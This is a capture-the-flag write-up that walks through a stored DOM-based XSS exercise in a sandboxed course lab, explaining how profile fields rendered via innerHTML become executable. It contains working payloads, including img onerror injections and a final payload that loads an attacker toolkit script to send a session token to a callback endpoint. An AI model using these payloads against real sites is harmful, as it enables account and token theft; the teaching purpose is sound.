# Task 3. Stored XSS - User Profile

## **Task 3 Description**


### 3. Stored XSS - User Profile

The profile page has a twist: it loads data from a JSON API, then renders it client-side. The API response looks clean. The bug is not in the server's JSON it is in how the browser renders it.

If the frontend uses `innerHTML` to insert profile data, any HTML stored in those fields becomes executable when the page loads.

#### Stage URLs

| Stage | URL | What Changes |
| :--- | :--- | :--- |
| 1 | `/profile` | Bio field rendered unsafely |
| 2 | `/profile/settings` | Script tags filtered |
| 3 | `/profile/edit` | Hidden: another profile field is vulnerable |

#### Mission Objectives
1. Open Network tab and find the API call that returns your profile data.
2. Open Sources or Elements and find where the API response is inserted into the DOM.
3. Look for `innerHTML` that is your sink.
4. Inject into the bio field, save, and reload. Watch the API response.
5. For Stage 3, inspect all profile fields, not just bio.

#### Hints
* JSON transport is safe. `innerHTML` rendering is not.
* `textContent` is safe `innerHTML` is the danger.
* Different profile fields may be rendered differently by the frontend code.
* Once your payload is stored, async rendering makes the delayed token pattern very reliable.

#### Deeper Concept
```text
API returns:      { "bio": "<img src=x onerror=alert(1)>" }
Frontend renders: profileDiv.innerHTML = data.bio
Browser executes: onerror fires → alert(1)
```
The JSON is safe in transit. The frontend made it dangerous.

#### Verification Checklist
- [ ] Network shows the API response carrying your payload
- [ ] Elements shows your payload inserted via `innerHTML`
- [ ] C2 shows form submission or storage exfiltration evidence
- [ ] Stage 3 returns the flag

#### Repo:
* **GitHub repository:** `dlh-cyber_security`
* **Directory:** `web_application_security/websec_0x0C`
* **File:** `4-flag.txt`



## **Solution**



- Start sandbox `cyber_websec_0x0c`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.
```bash
echo "10.42.4.60 web0x0c.hbtn" | sudo tee -a /etc/hosts
```


**Task 3 is a DOM-based stored XSS — the twist matters.** Unlike Task 2, where the *server* embedded the input into the HTML it sent, here the server's JSON API returns the data **clean and safe in transit**. The vulnerability is entirely **client-side**: the frontend JavaScript takes that JSON and injects a field into the page using **`innerHTML`** (the dangerous sink) instead of `textContent` (safe). So the same string is harmless as JSON but becomes executable the moment the browser parses it as HTML.

This is the distinction the learning objectives want us to be able to explain: **DOM-based XSS lives in the client-side source→sink flow, not the server response.** The source is `data.bio` (from the API); the sink is `element.innerHTML = ...`.

Same three-stage layout:
- **Stage 1** (`/profile`): bio field rendered unsafely via `innerHTML`.
- **Stage 2** (`/profile/settings`): `<script>` tags filtered (so again, `<img onerror>`/`<svg onload>`).
- **Stage 3** (`/profile/edit`): a *different* hidden field is the vulnerable one — flag here, saved to `4-flag.txt`.

**Step 1 — Recon: find the API call and the `innerHTML` sink.**

Before any payload, we map the source→sink flow. Navigate to:
```
http://web0x0c.hbtn/profile
```

With DevTools open:
1. **Network tab** → reload the page → find the **API request that returns your profile data** (look for an XHR/fetch returning JSON, something like `/api/profile` or `/profile/api/...`). We need its **URL** and its **JSON response body** (what fields it contains — `bio`, `name`, `website`, etc.).

```url
http://web0x0c.hbtn/profile/api/data
```
response body:
```json
{
	"bio":"",
	"location":"",
	"username":"Guest",
	"website":""
}
```

2. **Inspector** → find where your profile **bio** is displayed on the page, and note the element it lives in (e.g. `<div id="bio">...</div>`).

```html
<div class="mt-4">
    <!-- VULNERABLE: Profile data rendered with innerHTML via JS -->
    <h2 id="profile-username" class="text-2xl font-bold">Guest</h2>
    <div id="profile-bio" class="text-zinc-400 mt-2">No bio set</div>
    <div class="flex gap-4 mt-3 text-sm text-zinc-500">
        <span id="profile-location"></span>
        <span id="profile-website"></span>
    </div>
</div>
```


**Why both:** the Network request tells us the data **source** (and later, where to submit the payload); the rendered element tells us the **sink** location. Knowing the exact API URL now also saves us the endpoint-hunting pain we hit in Task 2 — we'll have the feature's real paths up front.



**The source (API):** `/profile/api/data` returns JSON with four fields:
```json
{"bio":"","location":"","username":"Guest","website":""}
```

**The sinks (DOM):** four elements the frontend populates from that JSON:
- `#profile-username` ← `username`
- `#profile-bio` ← `bio`
- `#profile-location` ← `location`
- `#profile-website` ← `website`

The HTML comment literally confirms it: `<!-- VULNERABLE: Profile data rendered with innerHTML via JS -->`. So the frontend JS reads the JSON and assigns these fields into the DOM — and the task tells us at least one uses `innerHTML` (dangerous) rather than `textContent` (safe).

**The key investigative question for a DOM XSS:** *which* fields go through `innerHTML` vs `textContent`? That's the whole game — and it directly sets up Stage 3's "a different field is vulnerable" twist. The frontend code will show us exactly. Let's read it.

**Step 2 — find the frontend rendering code (the sink assignment).**

We need the JavaScript that fetches `/profile/api/data` and assigns the fields.

In DevTools → **Sources** tab (or View Source `Ctrl+U`), search for how the fields are rendered.

**Why this is the decisive step:** it tells us, per field, whether the sink is `innerHTML` (exploitable) or `textContent` (safe). On Stage 1 the hint says `bio` is the `innerHTML` one. But for Stage 3, a *different* field (location? website? username?) will be the unexpected `innerHTML` sink while bio may be locked down. Reading this code once reveals the vulnerable field for every stage — no guessing.

Paste the rendering block (the lines assigning `data.bio`, `data.username`, `data.location`, `data.website` to their elements). That shows us exactly which sink to target.

```js
// Load profile data from API and render with innerHTML (VULNERABLE)
async function loadProfile() {
    try {
        const res = await fetch('/profile/api/data');
        const data = await res.json();

        // VULNERABLE: innerHTML with unsanitized data
        document.getElementById('profile-username').innerHTML = data.username || 'Guest';
        document.getElementById('profile-bio').innerHTML = data.bio || 'No bio set';
        document.getElementById('profile-location').innerHTML = data.location ? '📍 ' + data.location : '';
        document.getElementById('profile-website').innerHTML = data.website ? '🔗 ' + data.website : '';
    } catch (e) {
        document.getElementById('profile-username').textContent = 'Guest';
        document.getElementById('profile-bio').textContent = '';
    }
}
```

That's the whole vulnerability laid bare — and it answers every stage at once. Look at the rendering code:

```javascript
document.getElementById('profile-username').innerHTML = data.username || 'Guest';
document.getElementById('profile-bio').innerHTML      = data.bio || 'No bio set';
document.getElementById('profile-location').innerHTML = data.location ? '📍 ' + data.location : '';
document.getElementById('profile-website').innerHTML  = data.website ? '🔗 ' + data.website : '';
```

**All four fields use `innerHTML`.** Every one of them — `username`, `bio`, `location`, `website` — is an unsafe DOM sink. The `catch` block uses `textContent` (safe), but that only runs on error. So this is textbook DOM-based stored XSS: the server's JSON is clean, but the frontend converts every profile field into executable HTML via `innerHTML`.

This confirms the mechanism the task wants you to explain: **the server did nothing wrong — the JSON transport is safe. The frontend made it dangerous by choosing `innerHTML` over `textContent`.** The source is `data.<field>` (from the API), the sink is `.innerHTML =`, and the data flows source→sink entirely in the browser.

Since all four fields are `innerHTML`, Stage 3's "different field is vulnerable" twist is just: on `/profile/edit` the obvious `bio` field will be filtered, and we'll inject through `location`, `website`, or `username` instead — whichever the edit form exposes. We'll confirm that when we get there.

One important note from the `Deeper Concept` box and the hint *"async rendering makes the delayed token pattern very reliable"*: because `loadProfile()` runs **async** (it awaits the fetch), the profile fields — and the `tracking-id` — may not be in the DOM at the instant the `<img onerror>` fires. So we'll likely need `setTimeout` to delay the token read, exactly as the task hints.

**Step 3 — find the profile edit/save form and confirm the injection point.**

To store a payload, we need to **save** profile data (so the API returns it on reload). Navigate to:
```
http://web0x0c.hbtn/profile/edit
```

(This is Stage 3's URL, but it's also where the edit form lives — let's inventory it now.)


```html
<div class="bg-zinc-900 rounded-2xl border border-zinc-800 p-6">
        <h2 class="text-lg font-bold mb-4">Update Profile</h2>
        <div class="space-y-4">
            <div>
                <label class="block text-sm text-zinc-400 mb-1">Username</label>
                <input type="text" id="edit-username" value="Guest" class="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-2.5 focus:outline-none focus:border-nexus-500 transition-colors">
            </div>
            <div>
                <label class="block text-sm text-zinc-400 mb-1">Bio</label>
                <textarea id="edit-bio" rows="3" placeholder="Tell us about yourself..." class="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-2.5 focus:outline-none focus:border-nexus-500 transition-colors resize-none"></textarea>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <div>
                    <label class="block text-sm text-zinc-400 mb-1">Location</label>
                    <input type="text" id="edit-location" value="" class="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-2.5 focus:outline-none focus:border-nexus-500 transition-colors">
                </div>
                <div>
                    <label class="block text-sm text-zinc-400 mb-1">Website</label>
                    <input type="text" id="edit-website" value="" class="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-2.5 focus:outline-none focus:border-nexus-500 transition-colors">
                </div>
            </div>
            <button onclick="saveProfile()" class="bg-nexus-600 hover:bg-nexus-700 px-6 py-2.5 rounded-lg font-medium transition-colors">
                Save Changes
            </button>
        </div>
</div>
```

```js
async function saveProfile() {
    const data = {
        username: document.getElementById('edit-username').value,
        bio: document.getElementById('edit-bio').value,
        location: document.getElementById('edit-location').value,
        website: document.getElementById('edit-website').value
    };

    await fetch('/profile/api/update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });

    loadProfile();
}

loadProfile();
```


**The complete flow:**
- **Edit form** has four editable fields: `username`, `bio`, `location`, `website`.
- **Save** (`saveProfile()`): collects all four → `POST /profile/api/update` (JSON body) → then calls `loadProfile()`.
- **Load** (`loadProfile()`): `GET /profile/api/data` → assigns **all four fields via `innerHTML`**.

So the attack is: save a profile field containing an HTML payload → it persists server-side → on every page load, `loadProfile()` injects it via `innerHTML` → our event handler fires. Pure stored DOM XSS.

**A key subtlety for our payload (the async timing the task warned about):** `saveProfile()` calls `loadProfile()` which is `async` and awaits a fetch. Our `<img onerror>` will fire the moment `innerHTML` is set — but the `tracking-id` element and other data may not be ready yet. The task hint said this explicitly: *"async rendering makes the delayed token pattern very reliable."* So we'll wrap the token read in `setTimeout` from the start.

**Step 4 — store the first payload in the `bio` field (Stage 1 proof).**

Let's start on Stage 1 (`/profile`) by saving a payload in `bio`, then confirm it executes on reload. We'll use a harmless console test first to prove the `innerHTML` sink fires.

On `http://web0x0c.hbtn/profile/edit`:

1. In the **Bio** field, enter: `<img src=x onerror=console.log('PROFILE-XSS-OK')>`  (make sure there is no trailing whitespace or newline).
2. Leave the other fields as-is (username can stay "Guest").
3. Click **Save Changes**.
4. Then navigate to `http://web0x0c.hbtn/profile` (Stage 1) with **Console** open and reload.

Check:
1. `PROFILE-XSS-OK` prints in the console - ✅
2. In **Network**, confirm the `GET /profile/api/data` response now contains:
```json
{
    "bio":"<img src=x onerror=console.log('PROFILE-XSS-OK')>",
    "id":3,
    "location":"",
    "session_id":"DrOQc2pzn47aOQ8g20vDvO0ecLNsmDsVgiU9f8JF9d4",
    "stage":1,
    "username":"Guest",
    "website":""
}
```
3. In **Inspector**, confirm a real `<img>` node appears inside `#profile-bio`.
```html
<div id="profile-bio" class="text-zinc-400 mt-2"><img src="x" onerror="console.log('PROFILE-XSS-OK')"></div>
```


Two things worth noting:
- **`"stage":1`** — the API tells us which stage we're on. On `/profile/edit` this will read `stage:3`. This is the server-side scoreboard for this feature (like the `level_4_stage` cookie in Task 2).
- **`session_id`** matches the one from Task 2 — same session carries across the whole lab.

So Stage 1 is fully proven: payload stored → JSON carries it → `innerHTML` renders it → `<img onerror>` fires automatically. That satisfies the first two checklist items (Network shows payload in API response; Elements shows it inserted via `innerHTML`).

Now — the flag is at **Stage 3** (`/profile/edit` with a hidden vulnerable field), same as before. Rather than burn steps proving the token-exfil on Stage 1, let's go straight to Stage 3's structure, since we already know the exfil mechanism from Task 2 (load toolkit → `pwn(level, stage, callbackPath)` with the **feature-specific** path and **session-correct** stage).

But first we need two unknowns that are specific to this profile feature:
1. **The correct `callbackPath`** for the profile feature (not the sort or reviews one).
2. **Which field** is the Stage 3 injection point (bio may be filtered on `/profile/edit`).

**Step 6 — probe the profile track endpoint.**

In the browser or curl, test:

```bash
curl http://web0x0c.hbtn/profile/api/track?t=test
{"status":"error"}
```

That's the endpoint — confirmed on the first try this time. `/profile/api/track?t=test` → `{"status":"error"}` (not 404), so the endpoint exists and just needs a valid token. That's our `callbackPath`.


So we have everything we need except the Stage 3 injection field. Let's get that now.

**Step 7 — find the Stage 3 vulnerable field.**

Navigate to the Stage 3 URL:
```
http://web0x0c.hbtn/profile/edit
```

The hint says *"inspect all profile fields, not just bio"* — on Stage 3, bio is likely filtered but another field (`username`, `location`, or `website`) is still injected via `innerHTML`. We need to find which one survives.

Save a probe into **each** field at once so we can see which executes. In the edit form, set:
- **Username:** `<img src=x onerror=console.log('U')>`
- **Bio:** `<img src=x onerror=console.log('B')>`
- **Location:** `<img src=x onerror=console.log('L')>`
- **Website:** `<img src=x onerror=console.log('W')>`

(single line each, no trailing newline - the newline broke the script last time)

Click **Save Changes**, then reload `/profile/edit` (or `/profile`) with **Console** open.

**Results:**
1. The letters printed on console: `U`, `B`, `L`, `W` printed.
2. Checking the **`GET /profile/api/data`** response:
```json
{
	"bio":"<img src=x onerror=console.log('B')>",
	"id":4,
	"location":"<img src=x onerror=console.log('L')>",
	"session_id":"DrOQc2pzn47aOQ8g20vDvO0ecLNsmDsVgiU9f8JF9d4",
	"stage":1,
	"username":"<img src=x onerror=console.log('U')>",
	"website":"<img src=x onerror=console.log('W')>"
}
```


Interesting:

```json
{..., "stage":1, ...}
```

It says **`stage:1`**, even though you're on `/profile/edit`. And all four fields stored the raw payloads (all four `innerHTML` sinks are live — `U`, `B`, `L`, `W` all available). So `/profile/api/data` is returning the **same stored profile regardless of which URL we view it from** — the `stage` field here seems tied to something else, not the URL path.

This matters because `pwn()` needs the **correct stage number** to validate the flag (remember Task 2: wrong level/stage = no flag).


**Step 8 — fire the Stage 3 flag payload.**

We'll inject into the **bio** field (any of the four works, but bio is the documented Stage 1→3 field). The payload loads the toolkit and calls `pwn(3, 3, '/profile/api/track')`. Critically — per the task's own hint (*"async rendering makes the delayed token pattern very reliable"*) — we wrap it in `setTimeout` so the `tracking-id` is in the DOM before `pwn()` reads it.

On `http://web0x0c.hbtn/profile/edit`, set the **Bio** field to this **single line (no trailing newline)**:

```html
<img src=x onerror=setTimeout(function(){import('/attacker/toolkit.js').then(function(){XSS.pwn(3,3,'/profile/api/track')})},1500)>
```

Notes on why this shape:
- `setTimeout(...,1500)` — waits 1.5s for the async `loadProfile()` fetch + render to finish, so `tracking-id` exists when `pwn()` reads it (the task's "delayed token pattern").
- `function(){}` (not arrow) — avoids `>` breaking the attribute (the Task 2 lesson).
- Single quotes are fine **inside `onerror`** here because, unlike the reviews `title="..."` attribute, this `onerror=` value isn't wrapped in conflicting quotes in the DOM sink — but **keep it on one line with no trailing newline** (that was what broke the inline script earlier).

Then:
1. Click **Save Changes**.
2. Open **Network** (clear filter so you see toolkit.js, `/attacker/api/*`, and `track`) and **Console**.
3. Reload `/profile/edit` (or `/profile`).

Tell me:
1. **Console** — `[XSS Toolkit Loaded]` and `[PWN] Target compromised!`? Any error?
2. **Network** — did `/attacker/toolkit.js` load (200)? And what does **`GET /profile/api/track?t=...`** return in its **Response** — `{status:"error"}` or `{status:"tracked","ref":"FLAG{...}"}`?

If it returns the flag → that's your `4-flag.txt`. If it says `error`, we'll adjust the stage number (try the `stage:1` value the API reported, i.e. `pwn(1,3,...)`, or decode the session cookie for the authoritative number). Fire it and report the track response.
